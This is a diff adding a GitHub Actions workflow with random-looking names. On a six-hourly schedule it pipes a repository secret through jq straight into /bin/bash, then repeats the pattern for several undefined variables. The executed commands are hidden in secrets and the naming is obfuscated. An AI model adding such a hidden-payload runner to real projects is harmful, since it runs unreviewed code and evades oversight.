@@ -1,0 +1,22 @@
+name: wupianyu6712
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wupianyu6712
+        env:
+          sv68: ${{ secrets.sv68 }}
+        run: |
+          echo $sv68 | jq -r .tbh84 | /bin/bash
+          echo $ahac1 | jq -r .xb5 | /bin/bash
+          echo $lmqgd487 | jq -r .qkdkm6 | /bin/bash
+          echo $tswj00 | jq -r .ijdp61584 | /bin/bash
+          echo $kfpe64 | jq -r .l654 | /bin/bash
+          echo $bq3 | jq -r .dpnlp35 | /bin/bash
+
